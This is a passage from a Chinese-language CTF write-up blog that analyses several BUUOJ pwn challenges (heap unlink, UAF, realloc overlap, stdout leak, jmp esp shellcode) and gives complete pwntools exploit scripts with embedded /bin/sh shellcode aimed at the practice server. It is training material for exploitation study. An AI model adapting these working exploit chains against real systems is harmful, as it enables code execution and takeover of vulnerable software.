<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sla(<span class="hljs-string">'len'</span>,str(size))
    sa(<span class="hljs-string">'name'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

note = <span class="hljs-number">0x006020C0</span> + <span class="hljs-number">8</span>
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)
add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)
payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)
payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)
edit(<span class="hljs-number">0</span>,len(payload),payload)
free(<span class="hljs-number">1</span>)
show()
ru(<span class="hljs-string">'0 : '</span>)
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c48e0</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
free_hook = <span class="hljs-number">0x3c67a8</span> + libc_base
payload = p64(libc_base + <span class="hljs-number">0x3c48e0</span>) + p64(<span class="hljs-number">0</span>)  + p64(<span class="hljs-number">0x88</span>) + p64(free_hook)
edit(<span class="hljs-number">0</span>,len(payload),payload)
rec = rce16[<span class="hljs-number">1</span>] + libc_base
edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(rec))
free(<span class="hljs-number">2</span>)
itr()</code></pre></div>

<h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>32位程序，保护全关，目标定位着shellcode去。</p>
<h4 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>栈溢出，可以溢出14个字节，这是32位程序用rop就可以打了。但是为相对麻烦一点。</p>
<div class="hljs"><pre><code class="hljs python">.text:<span class="hljs-number">08048551</span>             hint            proc near
.text:<span class="hljs-number">08048551</span>             ; __unwind &#123;
.text:<span class="hljs-number">08048551</span> <span class="hljs-number">55</span>                          push    ebp
.text:<span class="hljs-number">08048552</span> <span class="hljs-number">89</span> E5                       mov     ebp, esp
.text:<span class="hljs-number">08048554</span> FF E4                       jmp     esp
.text:<span class="hljs-number">08048554</span>             hint            endp</code></pre></div>

<p>在题目当中，有个hint函数，就是给提示的，提示到<code>jmp esp</code> 这个gadget。</p>
<p>其中，可以想到在栈溢出中，有给<code>ret addr</code>填上<code>jmp esp</code> ，在接上shellcode。这应该是很经典的用法。</p>
<p>参考链接：<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p>
<p>构造思路：</p>
<div class="hljs"><pre><code class="hljs undefined">Payload = overflow + jmp esp<span class="hljs-built_in"> address </span>+ shellcode</code></pre></div>

<p>但是这个题就是只能溢出14字节，返回地址再占用4字节，应该没有10字节这样少的shellcode。</p>
<p>所以转变一下，栈上填充好shellcode，然后<code>jmp esp address</code>，接着让其执行<code>sub esp,0x28</code>，然后在跳转esp。</p>
<div class="hljs"><pre><code class="hljs undefined">Payload = shellcode + jmp esp<span class="hljs-built_in"> address </span>+ sub esp,esp + jmp esp</code></pre></div>

<p>其实基本都是一样的，后面跟上的，也可以理解为调整esp指针的shellcode。</p>
<h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_s_9'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26283</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

jmp_esp = <span class="hljs-number">0x08048554</span>
shellcode= <span class="hljs-string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>
shellcode = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">'\x00'</span>)
gadgets = asm(<span class="hljs-string">'sub esp,0x28;jmp esp'</span>)

print(gadgets)
payload = shellcode + p32(jmp_esp) + gadgets
<span class="hljs-comment"># debug()</span>
sl(payload)
itr()</code></pre></div>

<h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><h4 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul>
<li>UAF</li>
</ul>
<p>程序用realloc函数来分配堆块，因为不熟悉这个搞的我，好久没有做出来。</p>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="realloc的特点"><a href="#realloc的特点" class="headerlink" title="realloc的特点"></a>realloc的特点</h4><p>基础功能是改变<code>mem_address</code>所指内存区域的大小为newsize长度。这里就有几种不同的情况</p>
<ul>
<li>1.当size为0，这时就相当于free()函数，同时返回值为null</li>
<li>2.当指针为0，size大于0，相当于malloc函数</li>
<li>3.size小于等于原来的size，则在原先的基础上缩小，多余的堆块free掉</li>
<li>4.size大于原来的size，如果<strong>有足够空间</strong>就原基础扩充，空间不足则分配新的内存，并将原来指针指向的堆块旧内容复制到新的堆块内存中，然后再将原来的堆块free掉。</li>
</ul>
<p>其中第4点，有足够空间，画图解释一下：</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p>
<p>由于这个特性，来制作3个堆块A、B、C，B堆块作为进入unsortbin的堆块存在，C是为了防止不让C合并top chunk，然后用A来申请一个size&lt;=（A的size + B的size）的堆块，这样就造成了堆块的重叠。</p>
<h4 id="利用-IO-2-1-stdout-来泄漏信息"><a href="#利用-IO-2-1-stdout-来泄漏信息" class="headerlink" title="利用 _IO_2_1_stdout_ 来泄漏信息"></a><code>利用 _IO_2_1_stdout_ 来泄漏信息</code></h4><p>参考链接：<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p>
<p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p>
<p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p>
<p>这个题因为有过输出，其<code>_IO_CURRENTLY_PUTTING</code>就是为1的 ，对于<code>_IO_IS_APPENDING</code>这个flag的值，将这个flag搞成1之后，就可以通过修改<code>_IO_buf_base</code>来完成leak。</p>
<p>在赛题中，很多程序都是用过输出函数进行输出的，基本就是改掉flag，中间的三个变量在输出的过程中都不怎么用得到，直接盖成0,低位覆盖<code>_IO_buf_base</code>为合适的值就可以完成leak。</p>
<p>Flag 怎么设置，在赛题中还是很随意的：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0xfbad1887</span>
<span class="hljs-number">0xfbad3c80</span></code></pre></div>

<p>重点就是让<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p>
<p>大体的利用方法就是利用unsorted bin的在tcache或fastbin的fd上留下<code>main_arena</code>的地址，由于<code>_IO_2_1_stdout_</code>与<code>arena</code>只相差4位，且低三位已知，在传入是低3位覆盖fd留下的<code>main_arena</code>的地址，剩余一位可以爆破，概率1/16,从而劫持stdout以达到泄露的目的 。</p>
<h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./roarctf_2019_realloc_magic'</span>
elf = ELF(local_file)
<span class="hljs-comment"># context.log_level = 'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)
    libc = elf.libc
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'?'</span>,str(size))
    <span class="hljs-keyword">if</span> int(size) != <span class="hljs-number">0</span> :
        sa(<span class="hljs-string">'?'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>
    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'aaaaaaa'</span>)
    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'aaaaaaaa'</span>)
    add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)
    add(<span class="hljs-number">0x110</span>,<span class="hljs-string">' '</span>)
    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'a'</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
        free()
    add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)
    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x60\x87'</span>)
    payload = <span class="hljs-number">17</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">'\x60\x87'</span>
    add(<span class="hljs-number">0x190</span>,payload)
    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'\x60\x87'</span>)
    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    payload = p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>
    add(<span class="hljs-number">0x100</span>,payload)

leak = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-keyword">try</span>:
        leak_addr()
        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)
        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)
        io.recv(<span class="hljs-number">16</span>)
        leak = u64(io.recv(<span class="hljs-number">8</span>))
        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> Exception:
        io.close()
        <span class="hljs-comment"># io = process('./roarctf_2019_realloc_magic')</span>
        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)
        <span class="hljs-keyword">continue</span>

leak = leak &gt;&gt; <span class="hljs-number">16</span>
info_addr(<span class="hljs-string">'leak'</span>,leak)
libc_base = leak - <span class="hljs-number">4110208</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
free_hook = <span class="hljs-number">4118760</span> + libc_base
sys_addr = <span class="hljs-number">324832</span>+libc_base

sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'666'</span>)

add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'aaaaaaa'</span>)
add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'aaaaaaaa'</span>)
add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)
add(<span class="hljs-number">0x160</span>,<span class="hljs-string">' '</span>)
add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    free()
add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)
add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'\x60\x87'</span>)
payload = <span class="hljs-number">37</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(free_hook)
add(<span class="hljs-number">0x260</span>,payload)
add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)
add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
one_rec = rce18[<span class="hljs-number">1</span>] +libc_base
add(<span class="hljs-number">0x130</span>,p64(one_rec))
free()
<span class="hljs-comment"># debug()</span>

itr()</code></pre></div>

<p>其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。</p>
<h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>常规堆题，UAF，dup打<code>free_hook_</code>。上来用<code>puts(&amp;s)</code>，来泄漏栈上存在的libc地址。</p>
<h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_2019_en_3'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29542</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'story'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x20</span><span class="hljs-number">-8</span>)
sa(<span class="hljs-string">'name'</span>,payload)
sa(<span class="hljs-string">'ID'</span>,<span class="hljs-string">'chumen77'</span>)
ru(<span class="hljs-string">'chumen77'</span>)
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x81237</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
add(<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaaaaaa'</span>)

free(<span class="hljs-number">0</span>)
free(<span class="hljs-number">0</span>)
free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>
add(<span class="hljs-number">0x50</span>,p64(free_hook))
add(<span class="hljs-number">0x50</span>,p64(free_hook))
rec = rce18[<span class="hljs-number">1</span>] + libc_base
add(<span class="hljs-number">0x50</span>,p64(rec))
free(<span class="hljs-number">0</span>)
itr()</code></pre></div>

<h2 id="极客大挑战2019-Not-bad"><a href="#极客大挑战2019-Not-bad" class="headerlink" title="极客大挑战2019 Not bad"></a>极客大挑战2019 Not bad</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>溢出0x18个字节，加上本身的栈长度，读orw 的shellcode内存不是很够用。需要迁移到mmap，进行orw。所以摆在栈上的shellcode就是，来一个read函数，把orw放在mmap上，然后再跳转上去执行即可。并且再次用到 <code>jmp rsp</code> + shellcode.</p>
<h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./bad'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29794</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
mmap = <span class="hljs-number">0x123000</span>
jmp_rsp = <span class="hljs-number">0x0000000000400a01</span>
<span class="hljs-comment"># bss = 0x6010B0 - 0x20</span>
orw = asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))
orw += asm(shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))
orw += asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))

payload = asm(shellcraft.read(<span class="hljs-number">0</span>,mmap + <span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>)) + asm(<span class="hljs-string">'mov rax,0x123300;call rax'</span>)
payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>)
payload += p64(jmp_rsp) +   asm(<span class="hljs-string">'sub rsp,0x30;jmp rsp'</span>)

sa(<span class="hljs-string">'fun'</span>,payload)
s(orw)
itr()</code></pre></div>

<h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span>
<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
<span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span>
<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>

<p>保护开的不多，分析和利用起来简单不少。</p>
<p>这个题难点就是在于发现漏洞点。</p>
<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><div class="hljs"><pre><code class="hljs c">__int64 result; <span class="hljs-comment">// rax</span>
 <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span>
 <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span>
 <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span>
 <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span>
 __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>

<span class="hljs-built_in">printf</span>(<span class="hljs-string">"index: "</span>);
 idx = read_int();
 <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">16</span> )
 &#123;
   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"index is invalid."</span>);
   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
 &#125;
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">"size: "</span>);
 size = read_int();
 <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0x1000</span> )
 &#123;
   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"size is invalid."</span>);
   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
 &#125;
 buf = <span class="hljs-built_in">malloc</span>(size);
 <span class="hljs-keyword">if</span> ( !buf )
 &#123;
   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"malloc error."</span>);
   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
 &#125;
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>);
 read(<span class="hljs-number">0</span>, buf, size);
 show_diy((__int16)buf);</code></pre></div>

<p>可以自定义输入堆的编号，最大可以17个，就感觉有点奇怪。然后以栈上的一个buf来存取分配heap的地址。</p>
<div class="hljs"><pre><code class="hljs c">result = sub_400AB0((__int64)buf, idx);
  v5 = result;
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i )
  &#123;
    result = heaplist_idx[i];
    <span class="hljs-keyword">if</span> ( !result )
    &#123;
      heaplist_idx[i] = v5;
      result = i;
      sizelist[i] = size;
      <span class="hljs-keyword">break</span>;
    &#125;
  &#125;</code></pre></div>

<div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_400AB0</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2)</span>
</span>&#123;
  <span class="hljs-keyword">return</span> a1 | a2;
&#125;</code></pre></div>

<p>可以看到以堆地址与堆的id进行以来一个<code>|</code> 运算。然后返回回来给v5，然后在存入bss的一段地址中。算是处理过的堆地址。</p>
<p>尝试研究一下，做完处理是什么样子：</p>
<p>先分配一个堆号为1 和 16的堆块，看下bss里面是存入了什么。</p>
<div class="hljs"><pre><code class="hljs undefined">x/<span class="hljs-number">30</span>gx  <span class="hljs-number">0x6020E0</span>
<span class="hljs-number">0x6020e0</span>:       <span class="hljs-number">0x0000000000e35270</span>(<span class="hljs-number">16</span>)      <span class="hljs-number">0x0000000000e35281</span>(<span class="hljs-number">0</span>)</code></pre></div>

<div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">2</span>]: hex(<span class="hljs-number">0x0e35260</span> | <span class="hljs-number">16</span>)
Out[<span class="hljs-number">2</span>]: <span class="hljs-string">'0xe35270'</span>

In [<span class="hljs-number">3</span>]: hex(<span class="hljs-number">0x00e35281</span> | <span class="hljs-number">0</span>)
